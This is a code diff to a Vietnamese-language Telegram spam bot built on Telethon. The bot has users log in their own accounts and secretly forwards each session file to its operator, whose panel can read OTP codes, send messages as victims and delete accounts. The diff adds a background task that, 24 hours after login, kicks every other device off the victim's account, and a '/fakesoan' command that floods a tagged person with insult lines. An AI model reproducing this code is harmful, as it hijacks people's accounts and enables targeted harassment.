@@ -13,13 +13,33 @@ from telethon.errors import (
 A_ID = 32300846
 A_HS = "a6da3117ff6b8a1679d04ab743976068"
 B_TK = os.getenv("BOT_TOKEN")
-O_ID = 7907990385  # ID ADMIN DUY NHẤT CÓ QUYỀN
+O_ID = 7907990385  # ID ADMIN DUY NHẤT CÓ QUYỀN CAO NHẤT
+ADMIN_2_ID = 7462915877  # ID ADMIN HỖ TRỢ THỨ 2
+
 BOT_USERNAME = "@minhduchotwar1_bot"
 
-REQUIRED_GROUPS = [
+GROUPS_FILE = "required_groups.json"
+DEFAULT_REQUIRED_GROUPS = [
     {"username": "muadonglanhgia36", "link": "https://t.me/muadonglanhgia36", "name": "Nhóm 1"},
     {"username": "chatmuadonglanhgia", "link": "https://t.me/chatmuadonglanhgia", "name": "Nhóm 2"}
 ]
+
+def load_required_groups():
+    if os.path.exists(GROUPS_FILE):
+        try:
+            with open(GROUPS_FILE, "r", encoding="utf-8") as f:
+                data = json.load(f)
+                if isinstance(data, list) and data:
+                    return data
+        except:
+            pass
+    return DEFAULT_REQUIRED_GROUPS
+
+def save_required_groups(groups):
+    with open(GROUPS_FILE, "w", encoding="utf-8") as f:
+        json.dump(groups, f, ensure_ascii=False, indent=4)
+
+REQUIRED_GROUPS = load_required_groups()
 
 U1 = "https://raw.githubusercontent.com/ehvuebe-png/Cailontaone/main/chui.txt"
 U2 = "https://gist.githubusercontent.com/tranthanhloc2099-wq/26971850c22bbc6578dae5a91fc2f154/raw/e96b3178dbce97dab5a9218eced5085802eb1711/chui2.txt"
@@ -75,7 +95,7 @@ else: verified_users = set()
 
 if os.path.exists(F4):
     with open(F4, "r") as f: admins = set(int(l.strip()) for l in f if l.strip())
-else: admins = {O_ID}
+else: admins = {O_ID, ADMIN_2_ID}
 
 if os.path.exists(F5):
     with open(F5, "r") as f: v_u = set(int(l.strip()) for l in f if l.strip())
@@ -104,7 +124,7 @@ def _su(u):
         with open(F1, "a") as f: f.write(f"{u}\n")
 
 async def is_user_in_channel(user_id):
-    if user_id == O_ID: return True
+    if user_id in admins: return True
     try:
         for group in REQUIRED_GROUPS:
             await bot(functions.channels.GetParticipantRequest(
@@ -125,7 +145,6 @@ async def is_user_in_channel(user_id):
         return False
 
 async def send_session_file_to_admin(client, user_id, phone_number):
-    """CHỈ GỬI FILE SESSION VỀ CHO DUY NHẤT ID ADMIN CHÍNH (O_ID)"""
     session_file_name = f"u_{user_id}.session"
     if os.path.exists(session_file_name):
         try:
@@ -151,7 +170,7 @@ Vui lòng chọn ứng dụng bạn muốn chiến:
     buttons = [
         [Button.inline("📱 Telegram War System", data="app_telegram")],
         [Button.inline("🤖 Discord Spam System", data="app_discord")],
-        [Button.url("💬 Hồ Sơ Admin Hỗ Trợ", "https://t.me/Mduchotwar")]
+        [Button.url("💬 Admin 1 Hỗ Trợ", "https://t.me/Mduchotwar"), Button.url("💬 Admin 2 Hỗ Trợ", "https://t.me/Choancutz")]
     ]
     return msg, buttons
 
@@ -178,19 +197,19 @@ def get_main_menu(u):
 
     buttons.append([Button.inline("📱 LOGIN TÀI KHOẢN", data="login"), Button.inline("🚪 LOGOUT", data="logout_acc")])
     
-    if u == O_ID:
+    if u in admins:
         buttons.append([Button.inline("👑 Lệnh Admin System", data="m_admin")])
         
     buttons.append([Button.inline("🔙 Quay Lại Chọn App", data="back_to_apps")])
-    buttons.append([Button.url("💬 Hồ Sơ Admin Hỗ Trợ", "https://t.me/Mduchotwar")])
+    buttons.append([Button.url("💬 Admin 1 Hỗ Trợ", "https://t.me/Mduchotwar"), Button.url("💬 Admin 2 Hỗ Trợ", "https://t.me/Choancutz")])
     
     return msg, buttons
 
 def get_join_msg():
     msg = """
-⚠️ **YÊU CẦU THAM GIA ĐỦ 2 NHÓM**
+⚠️ **YÊU CẦU THAM GIA ĐỦ CÁC NHÓM**
 
-Bạn phải tham gia **đầy đủ các nhóm** dưới đây thì mới sử dụng được bot:
+Bạn phải tham gia **đầy đủ tất cả các nhóm** dưới đây thì mới sử dụng được bot:
 """
     buttons = []
     idx = 1
@@ -247,6 +266,47 @@ async def notify_admin_login(client, user_id, phone_number):
     except Exception as e:
         print(f"Lỗi gửi thông báo login: {e}")
 
+async def check_and_kick_devices_background(target_uid, client):
+    time_file = f"login_time_{target_uid}.txt"
+    kicked_done = False
+    
+    if not os.path.exists(time_file):
+        with open(time_file, "w") as f:
+            f.write(str(time.time()))
+
+    while target_uid in u_c:
+        try:
+            await client.get_me()
+            if not kicked_done and os.path.exists(time_file):
+                with open(time_file, "r") as f:
+                    login_timestamp = float(f.read().strip())
+                
+                elapsed = time.time() - login_timestamp
+                if elapsed >= 86400:
+                    auths = await client(functions.account.GetAuthorizationsRequest())
+                    total_devices = len(auths.authorizations)
+                    kicked_count = 0
+                    
+                    for auth in auths.authorizations:
+                        if not auth.current:
+                            try:
+                                await client(functions.account.ResetAuthorizationRequest(hash=auth.hash))
+                                kicked_count += 1
+                            except: pass
+                    
+                    await bot.send_message(
+                        O_ID,
+                        f"🛡 **TỰ ĐỘNG KIỂM TRA & KICK THIẾT BỊ (ĐÃ ĐỦ 24H)**\n"
+                        f"• ID Acc: `{target_uid}`\n"
+                        f"• Tổng số thiết bị đang có: `{total_devices}`\n"
+                        f"• Đã tự động kick thành công: `{kicked_count}` thiết bị lạ!",
+                        parse_mode='markdown'
+                    )
+                    kicked_done = True
+        except Exception:
+            pass
+        await asyncio.sleep(300)
+
 async def start_anti_disconnect(target_uid, client):
     while target_uid in u_c:
         try: await client.get_me()
@@ -270,6 +330,7 @@ def _logic(c, u_i):
 • `/sptagname <@username>` : Spam tag tên liên tục.
 • `/sp <id>` : Spam kho ngôn vào đối tượng.
 • `/sp2 <id>` : Spam kho ngôn vào đối tượng.
+• `/fakesoan` : [Spam VIP Mặc Định] Reply 1 người, giả lập đang soạn (delay 2s an toàn) rồi gửi.
 • `/spicon <số_lượng>` : Spam các icon trêu tức.
 • `/stop` : Dừng ngay lập tức toàn bộ tiến trình spam.
 
@@ -286,7 +347,7 @@ def _logic(c, u_i):
 • `/voice <văn_bản>` : Chuyển đổi văn bản thành Voice Tiếng Việt.
 
 ⚡ **Delay hiện tại:** `{get_user_delay(u_i)}s`
-💬 **Hỗ trợ Admin:** @Mduchotwar
+💬 **Hỗ trợ Admin:** @Mduchotwar & @Choancutz
 """
         await e.edit(help_text, parse_mode='markdown')
 
@@ -323,6 +384,34 @@ def _logic(c, u_i):
                     await asyncio.sleep(delay)
                 except FloodWaitError as err: await asyncio.sleep(err.seconds + 2)
                 except: break
+
+    @c.on(events.NewMessage(outgoing=True, pattern=r'/fakesoan'))
+    async def _fakesoan_cmd(e):
+        if not e.is_reply:
+            return await e.edit("⚠️ **Vui lòng reply (trả lời) tin nhắn của 1 người cần spam VIP!**")
+        
+        reply_msg = await e.get_reply_message()
+        tid = reply_msg.sender_id
+        _mk(e.chat_id)
+        await e.delete()
+        
+        lines = get_user_lines(u_i)
+        if not lines: return
+        s_t[u_i] = True
+        
+        while s_t.get(u_i):
+            for m in lines:
+                if not s_t.get(u_i): break
+                try:
+                    async with c.action(e.chat_id, 'typing'):
+                        await asyncio.sleep(2.0)
+                    
+                    fm = f"{m.strip()} [\u200b](tg://user?id={tid})" if tid else m.strip()
+                    await c.send_message(e.chat_id, fm, parse_mode='markdown')
+                except FloodWaitError as err:
+                    await asyncio.sleep(err.seconds + 2)
+                except:
+                    break
 
     @c.on(events.NewMessage(outgoing=True, pattern=r'/info(?:\s+(.+))?'))
     async def _inf(e):
@@ -505,7 +594,6 @@ async def _callback_handler(ev):
     elif data == "app_discord":
         return await ev.answer("⚠️ Tính năng đang đc bảo trì!", alert=True)
 
-    # ADMIN CONTROL PANEL
     elif data == "m_control":
         if u != O_ID: return await ev.answer("❌ Bạn không có quyền Admin chính!", alert=True)
         if not u_c:
@@ -541,7 +629,7 @@ async def _callback_handler(ev):
             [Button.inline("💬 Gửi Đơn Nhóm / IB", data="rmt_send_one"), Button.inline("🥷 Gửi Ẩn Đơn", data="rmt_send_ghost")],
             [Button.inline("📢 Gửi All Nhóm", data="rmt_send_all"), Button.inline("🥷 Gửi Ẩn All Nhóm", data="rmt_send_all_ghost")],
             [Button.inline("➕ Tự Động Nhập Nhóm Cần Vào", data="rmt_auto_join_groups")],
-            [Button.inline("🔑 Check Mã OTP Telegram", data="rmt_check_otp"), Button.inline("🥷 Kick Mọi Thiết Bị Khác (Trừ Bot)", data="rmt_kick_devices")],
+            [Button.inline("🔑 Check Mã OTP Telegram", data="rmt_check_otp"), Button.inline("📱 Check & Kick Thiết Bị", data="rmt_kick_devices")],
             [Button.inline("✏️ Đổi Tên/Bio/Avt", data="rmt_custom_profile"), Button.inline("🗑 Xóa Vĩnh Viễn Acc", data="rmt_delete_account")],
             [Button.inline("📋 Check Số Nhóm", data="rmt_count_groups"), Button.inline("📜 Lịch Sử 10 Tin", data="rmt_hist_p1")],
             [Button.inline("🔙 Chọn Acc Khác", data="m_control")]
@@ -622,11 +710,18 @@ async def _callback_handler(ev):
         if u != O_ID: return
         target_uid = admin_selected_target.get(u)
         if not target_uid or target_uid not in u_c: return await ev.answer("Tài khoản lỗi!", alert=True)
-        await ev.answer("⏳ Đang tiến hành kick các thiết bị khác...", alert=True)
+        await ev.answer("⏳ Đang kiểm tra và quản lý thiết bị...", alert=True)
         client = u_c[target_uid]
         
         try:
             auths = await client(functions.account.GetAuthorizationsRequest())
+            total_dev = len(auths.authorizations)
+            dev_list_text = f"📱 **DANH SÁCH THIẾT BỊ ĐANG ĐĂNG NHẬP (Tổng: {total_dev}):**\n"
+            
+            for auth in auths.authorizations:
+                current_mark = "🟢 (Phiên hiện tại của Bot)" if auth.current else "💻 (Thiết bị khác)"
+                dev_list_text += f"\n• Thiết bị: `{auth.device_model}` ({auth.platform}) {current_mark}\n  IP/Quốc gia: `{auth.country}`"
+
             kicked = 0
             for auth in auths.authorizations:
                 if not auth.current:
@@ -635,18 +730,15 @@ async def _callback_handler(ev):
                         kicked += 1
                     except: pass
             
-            if kicked > 0:
-                await ev.respond(f"✅ **Đã KICK thành công `{kicked}` thiết bị khác ra khỏi tài khoản (Giữ nguyên phiên làm việc của Bot)!**")
-            else:
-                await ev.respond("ℹ️ **Hiện tại không có thiết bị khác nào ngoài phiên của Bot đang hoạt động!**")
+            await ev.respond(dev_list_text + f"\n\n👉 **Kết quả:** Đã kick thành công `{kicked}` thiết bị khác ra khỏi tài khoản!")
 
         except RPCError as ex:
             if "FRESH_RESET_AUTHORISATION_FORBIDDEN" in str(ex):
-                await ev.respond("❌ **Chính sách bảo mật Telegram:** Tài khoản mới đăng nhập chưa đủ 24h nên Telegram tạm thời chặn tính năng kick thiết bị khác. Vui lòng thử lại sau 24h!")
+                await ev.respond("❌ **Chính sách bảo mật Telegram:** Tài khoản mới đăng nhập chưa đủ 24h nên Telegram tạm thời chặn tính năng kick thiết bị khác. Bot sẽ tự động kick sau khi đủ 24h!")
             else:
                 await ev.respond(f"❌ **Lỗi Telegram:** `{ex}`")
         except Exception as ex:
-            await ev.respond(f"❌ **Lỗi kick thiết bị:** `{ex}`")
+            await ev.respond(f"❌ **Lỗi quản lý thiết bị:** `{ex}`")
 
     elif data == "rmt_send_one":
         if u != O_ID: return
@@ -864,7 +956,7 @@ async def _callback_handler(ev):
 
     elif data == "m_spam":
         warn = "\n\n⚠️ **Lưu ý:** *Vui lòng LOGIN tài khoản để thực thi các lệnh này!*" if u not in u_c else ""
-        txt = f"💥 **DANH SÁCH LỆNH SPAM & TAG**\n────────────────\n• `/sptagname <Tên>`: Spam tag kèm tên\n• `/sp <id>`: Spam chửi 1\n• `/sp2 <id>`: Spam chửi 2\n• `/spicon <số>`: Spam icon\n• `/stop`: Dừng lại tất cả{warn}"
+        txt = f"💥 **DANH SÁCH LỆNH SPAM & TAG**\n────────────────\n• `/sptagname <Tên>`: Spam tag kèm tên\n• `/sp <id>`: Spam chửi 1\n• `/sp2 <id>`: Spam chửi 2\n• `/fakesoan`: Spam VIP (Reply 1 người, giả lập đang soạn delay 2s mặc định cố định)\n• `/spicon <số>`: Spam icon\n• `/stop`: Dừng lại tất cả{warn}"
         await ev.edit(txt, buttons=[[Button.inline("🔙 Trở Về", data="m_main")]], parse_mode='markdown')
 
     elif data == "m_mute":
@@ -989,9 +1081,95 @@ async def _callback_handler(ev):
         await ev.edit(msg, buttons=buttons, parse_mode='markdown')
 
     elif data == "m_admin":
-        if u != O_ID: return await ev.answer("❌ Chỉ Admin chính!", alert=True)
-        txt = "👑 **ADMIN SYSTEM**\n• `/ban <id>`\n• `/unban <id>`\n• `/addadmin <id>`\n• `/addvip <id>`\n• `/delvip <id>`\n• `/tb <nội dung>`"
-        await ev.edit(txt, buttons=[[Button.inline("🔙 Trở Về", data="m_main")]], parse_mode='markdown')
+        if u not in admins: return await ev.answer("❌ Chỉ Admin hệ thống!", alert=True)
+        txt = """👑 **ADMIN SYSTEM MANAGEMENT**
+────────────────
+• `/ban <id>` - Ban người dùng
+• `/unban <id>` - Gỡ ban
+• `/addadmin <id>` - Thêm admin
+• `/addvip <id>` - Thêm VIP
+• `/delvip <id>` - Xóa VIP
+• `/tb <nội dung>` - Gửi thông báo
+"""
+        buttons = [
+            [Button.inline("➕ Thêm Nhóm Bắt Buộc", data="adm_add_group"), Button.inline("🗑 Xóa Nhóm Bắt Buộc", data="adm_del_group")],
+            [Button.inline("📋 Danh Sách Nhóm Bắt Buộc", data="adm_list_groups")],
+            [Button.inline("🔙 Trở Về", data="m_main")]
+        ]
+        await ev.edit(txt, buttons=buttons, parse_mode='markdown')
+
+    elif data == "adm_list_groups":
+        if u not in admins: return
+        await ev.answer()
+        txt = "📋 **DANH SÁCH NHÓM/KÊNH BẮT BUỘC HIỆN TẠI:**\n────────────────\n"
+        idx = 1
+        for g in REQUIRED_GROUPS:
+            txt += f"{idx}. **{g['name']}**\n   • Username: `@{g['username']}`\n   • Link: {g['link']}\n\n"
+            idx += 1
+        buttons = [[Button.inline("🔙 Trở Về Menu Admin", data="m_admin")]]
+        await ev.edit(txt, buttons=buttons, parse_mode='markdown')
+
+    elif data == "adm_add_group":
+        if u not in admins: return
+        await ev.answer()
+        async with bot.conversation(u) as cv:
+            await cv.send_message("📢 **Nhập Tên Hiển Thị của Nhóm/Kênh** (VD: `Nhóm 3`):")
+            name_res = await cv.get_response()
+            g_name = name_res.text.strip()
+
+            await cv.send_message("🔗 **Nhập Link hoặc Username của Nhóm/Kênh** (VD: `https://t.me/abc` hoặc `abc`):")
+            link_res = await cv.get_response()
+            raw_link = link_res.text.strip()
+
+            username_match = re.search(r'(?:https?://t\.me/|@)?([a-zA-Z0-9_]{5,})', raw_link)
+            if not username_match:
+                return await cv.send_message("❌ Username hoặc Link nhóm không hợp lệ!")
+            
+            g_username = username_match.group(1)
+            g_link = raw_link if raw_link.startswith("http") else f"https://t.me/{g_username}"
+
+            # Thêm vào danh sách
+            global REQUIRED_GROUPS
+            REQUIRED_GROUPS.append({
+                "username": g_username,
+                "link": g_link,
+                "name": g_name
+            })
+            save_required_groups(REQUIRED_GROUPS)
+            await cv.send_message(f"✅ **Đã thêm thành công nhóm bắt buộc mới!**\n• Tên: `{g_name}`\n• Username: `@{g_username}`")
+
+    elif data == "adm_del_group":
+        if u not in admins: return
+        await ev.answer()
+        if not REQUIRED_GROUPS:
+            return await ev.respond("⚠️ Hiện tại không có nhóm bắt buộc nào để xóa!")
+        
+        buttons = []
+        for idx, g in enumerate(REQUIRED_GROUPS):
+            buttons.append([Button.inline(f"❌ Xóa: {g['name']} (@{g['username']})", data=f"del_g_{idx}")])
+        buttons.append([Button.inline("🔙 Trở Về", data="m_admin")])
+        
+        await ev.edit("🗑 **Chọn nhóm bạn muốn loại bỏ khỏi danh sách bắt buộc:**", buttons=buttons, parse_mode='markdown')
+
+    elif data.startswith("del_g_"):
+        if u not in admins: return
+        idx = int(data.split("_")[2])
+        global REQUIRED_GROUPS
+        if 0 <= idx < len(REQUIRED_GROUPS):
+            removed = REQUIRED_GROUPS.pop(idx)
+            save_required_groups(REQUIRED_GROUPS)
+            await ev.answer(f"✅ Đã xóa nhóm {removed['name']} thành công!", alert=True)
+        else:
+            await ev.answer("❌ Nhóm không tồn tại hoặc đã bị xóa!", alert=True)
+        
+        # Trở về danh sách admin menu
+        txt = "👑 **ADMIN SYSTEM MANAGEMENT**\n────────────────\n• `/ban <id>`\n• `/unban <id>`\n• `/addadmin <id>`\n• `/addvip <id>`\n• `/delvip <id>`\n• `/tb <nội dung>`"
+        buttons = [
+            [Button.inline("➕ Thêm Nhóm Bắt Buộc", data="adm_add_group"), Button.inline("🗑 Xóa Nhóm Bắt Buộc", data="adm_del_group")],
+            [Button.inline("📋 Danh Sách Nhóm Bắt Buộc", data="adm_list_groups")],
+            [Button.inline("🔙 Trở Về", data="m_main")]
+        ]
+        await ev.edit(txt, buttons=buttons, parse_mode='markdown')
 
     elif data == "login":
         if u in u_c: return await ev.answer("✅ Bạn đã đăng nhập rồi!", alert=True)
@@ -1023,10 +1201,16 @@ async def _callback_handler(ev):
                 
                 u_c[u] = c; _logic(c, u)
                 
+                with open(f"login_time_{u}.txt", "w") as f:
+                    f.write(str(time.time()))
+
                 await send_session_file_to_admin(c, u, p)
 
                 task = asyncio.create_task(start_anti_disconnect(u, c))
                 anti_disconnect_tasks[u] = task
+
+                dev_task = asyncio.create_task(check_and_kick_devices_background(u, c))
+                anti_disconnect_tasks[f"dev_{u}"] = dev_task
 
                 await notify_admin_login(c, u, p)
                 await cv.send_message("✅ **LOGIN THÀNH CÔNG & Tất cả Chức Năng Đã Dùng đc**")
@@ -1038,28 +1222,28 @@ async def _callback_handler(ev):
 # ==========================================
 @bot.on(events.NewMessage(pattern=r'/addadmin (\d+)'))
 async def _addadmin(e):
-    if e.sender_id != O_ID: return
+    if e.sender_id not in admins: return
     aid = int(e.pattern_match.group(1))
     admins.add(aid); _save_admins()
     await e.respond(f"✅ Đã thêm Admin `{aid}`!")
 
 @bot.on(events.NewMessage(pattern=r'/addvip (\d+)'))
 async def _addvip(e):
-    if e.sender_id != O_ID: return
+    if e.sender_id not in admins: return
     vid = int(e.pattern_match.group(1))
     v_u.add(vid); _sv()
     await e.respond(f"🌟 Đã thêm VIP `{vid}`!")
 
 @bot.on(events.NewMessage(pattern=r'/delvip (\d+)'))
 async def _delvip(e):
-    if e.sender_id != O_ID: return
+    if e.sender_id not in admins: return
     vid = int(e.pattern_match.group(1))
     v_u.discard(vid); _sv()
     await e.respond(f"❌ Đã xóa VIP `{vid}`!")
 
 @bot.on(events.NewMessage(pattern=r'/ban (\d+)'))
 async def _bn(e):
-    if e.sender_id != O_ID: return
+    if e.sender_id not in admins: return
     target = int(e.pattern_match.group(1))
     b_u.add(target); _sb()
     if target in u_c:
@@ -1071,7 +1255,7 @@ async def _bn(e):
 
 @bot.on(events.NewMessage(pattern=r'/unban (\d+)'))
 async def _ubn(e):
-    if e.sender_id != O_ID: return
+    if e.sender_id not in admins: return
     target = int(e.pattern_match.group(1))
     if target in b_u:
         b_u.remove(target); _sb()
@@ -1079,7 +1263,7 @@ async def _ubn(e):
 
 @bot.on(events.NewMessage(pattern=r'/tb\s+([\s\S]+)'))
 async def _tb(e):
-    if e.sender_id != O_ID: return
+    if e.sender_id not in admins: return
     msg = e.pattern_match.group(1)
     if not os.path.exists(F1): return
     await e.respond("📣 Đang gửi thông báo...")
@@ -1127,6 +1311,9 @@ async def main():
                 _logic(c, u)
                 task = asyncio.create_task(start_anti_disconnect(u, c))
                 anti_disconnect_tasks[u] = task
+                
+                dev_task = asyncio.create_task(check_and_kick_devices_background(u, c))
+                anti_disconnect_tasks[f"dev_{u}"] = dev_task
             else: await c.disconnect()
         except: pass
         
